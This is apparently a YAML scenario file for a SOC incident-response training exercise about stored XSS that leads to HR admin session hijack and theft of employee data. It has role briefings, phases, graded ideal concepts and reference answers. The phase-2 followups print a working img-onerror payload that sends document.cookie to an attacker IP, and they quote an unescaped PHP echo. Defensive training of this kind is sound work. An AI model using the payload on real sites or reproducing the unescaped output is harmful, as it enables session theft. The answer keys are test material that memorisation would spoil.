id: stored_xss___admin_session_hijack
name: Stored XSS — Admin Session Hijack
category: Web App
format_version: 2
difficulty: Hard
soc_tier: L1
roles:
- analyst
- incident_manager
- ciso
- executive
industries:
- all
briefings:
  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
  incident_manager: You are the Incident Manager coordinating the response to Stored XSS Leads to Admin Session Hijack. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
  ciso: You are the CISO accountable for Stored XSS Leads to Admin Session Hijack. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
  executive: You are the executive sponsor for Stored XSS Leads to Admin Session Hijack. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
executive_brief: 'Executive summary of the Stored XSS Leads to Admin Session Hijack incident. Your organization runs an internal HR management system at hr.internal.acmecorp.com (PHP application on Apache, MySQL backend). An employee in the Marketing department submitted a support ticket with a suspicious description containing JavaScript. The ticket system rendered the description without sanitization (stored XSS). When an HR admin viewed the ticket, the XSS fired and sent the admin''s session cookie to an external server. The attacker then used the stolen session to log in as the HR admin and exported the entire employee database (3,200 records including salary, SSN, home address, and performance reviews). The SOC detected the outbound HTTP POST from the HR admin''s workstation to an unknown external IP at 14:22. By the time the SOC investigated, the data export had already completed (14:28). The attacker''s receiving server is at 92.38.176.xx. Business impact: customer-facing service
  availability and data confidentiality are at risk, and customer notification may be required. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: privacy counsel should assess breach-notification duties for exposed customer records.'
incident:
  title: Stored XSS Leads to Admin Session Hijack
  opening: Your organization runs an internal HR management system at hr.internal.acmecorp.com (PHP application on Apache, MySQL backend). An employee in the Marketing department submitted a support ticket with a suspicious description containing JavaScript.
  summary: Your organization runs an internal HR management system at hr.internal.acmecorp.com (PHP application on Apache, MySQL backend). An employee in the Marketing department submitted a support ticket with a suspicious description containing JavaScript. The ticket system rendered the description without sanitization (stored XSS). When an HR admin viewed the ticket, the XSS fired and sent the admin's session cookie to an external server. The attacker then used the stolen session to log in as the HR admin and exported the entire employee database (3,200 records including salary, SSN, home address, and performance reviews). The SOC detected the outbound HTTP POST from the HR admin's workstation to an unknown external IP at 14:22. By the time the SOC investigated, the data export had already completed (14:28). The attacker's receiving server is at 92.38.176.xx.
  compromised_assets:
  - hr.internal.acmecorp.com
  - HR admin account
  - 3,200 employee records (PII + salary)
  detected_via: 'IDS alert: HTTP POST to unknown external IP from HR admin workstation'
  kill_chain:
  - Execution
  - Credential Access
  - Collection
  - Impact
  mitre_tactics:
  - Execution
  - Credential Access
phases:
- id: immediate_containment_phase_1
  phase_type: triage
  title: Immediate Containment — Phase 1
  situation: The HR admin's session is compromised. The attacker used it to export employee data. The session cookie may still be valid. The admin is still logged in.
  prompt: What do you do first?
  guidance:
    what: 'Separate signal from noise: confirm the alert on hr.internal.acmecorp.com, its severity, and the affected accounts.'
    action: What do you do first?
    why: Rapid scoping decides everything downstream — triage is where containment starts.
  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Immediate Containment — Phase 1. Asset in scope: hr.internal.acmecorp.com.'
  hints:
  - Consider pulling the relevant logs for the affected window.
  - Think about which accounts or assets could be affected.
  ideal_concepts:
  - immediately invalidate
  - invalidate admin
  - admin session
  - session server
  - server block
  - outbound http
  - http firewall
  reference_answer: |-
    Immediately invalidate the HR admin's session on the server AND block outbound HTTP to 92.38.176.xx at the firewall

    Why: Kills the attacker's session AND blocks the exfil channel simultaneously.
  followup_good: The attacker's session is killed. You need to find the XSS payload that caused the initial compromise. The ticket system stores all submissions in MySQL. The IDS flagged the POST to 92.38.176.xx but you need to trace it back to the source.
  followup_weak: |-
    Kills the attacker's session AND blocks the exfil channel simultaneously.

    The attacker's session is killed. You need to find the XSS payload that caused the initial compromise. The ticket system stores all submissions in MySQL. The IDS flagged the POST to 92.38.176.xx but you need to trace it back to the source.
  next: malicious_input_identification_phase_2
  mitre_tactic: Credential Access
  mitre_technique: T1539 Steal Web Session Cookie
- id: malicious_input_identification_phase_2
  phase_type: containment
  title: Malicious Input Identification — Phase 2
  situation: The attacker's session is killed. You need to find the XSS payload that caused the initial compromise. The ticket system stores all submissions in MySQL. The IDS flagged the POST to 92.38.176.xx but you need to trace it back to the source.
  prompt: How do you find the malicious ticket?
  guidance:
    what: 'Balance speed against disruption: what must be isolated now, and what can wait for scoping?'
    action: How do you find the malicious ticket?
    why: The first containment action sets the blast radius for everything that follows.
  hint: 'Prioritize the move that limits blast radius without destroying the evidence you will need later. Focus: Malicious Input Identification — Phase 2. Asset in scope: hr.internal.acmecorp.com.'
  hints:
  - Consider the affected accounts and their privilege level.
  - Preserve evidence before disrupting anything.
  ideal_concepts:
  - query tickets
  - tickets table
  - table entries
  - entries containing
  - containing script
  - script onerror
  - onerror document
  - document cookie
  reference_answer: |-
    Query the tickets table for entries containing '<script' or 'onerror' or 'document.cookie' and cross-reference with the time the IDS alert fired

    Why: Finds the stored XSS payload in the database and correlates timing to confirm causation.
  followup_good: 'Found it: ticket #4521 submitted by Marketing user ''mike.jones'' contains: <img src=x onerror="new Image().src=''http://92.38.176.xx/c?c=''+document.cookie"> The ticket system''s PHP renders ticket descriptions with echo $description (no escaping). Mike Jones says he received an email with a ''promotional offer'' and pasted the content into the ticket form.'
  followup_weak: |-
    Finds the stored XSS payload in the database and correlates timing to confirm causation.

    Found it: ticket #4521 submitted by Marketing user 'mike.jones' contains: <img src=x onerror="new Image().src='http://92.38.176.xx/c?c='+document.cookie"> The ticket system's PHP renders ticket descriptions with echo $description (no escaping). Mike Jones says he received an email with a 'promotional offer' and pasted the content into the ticket form.
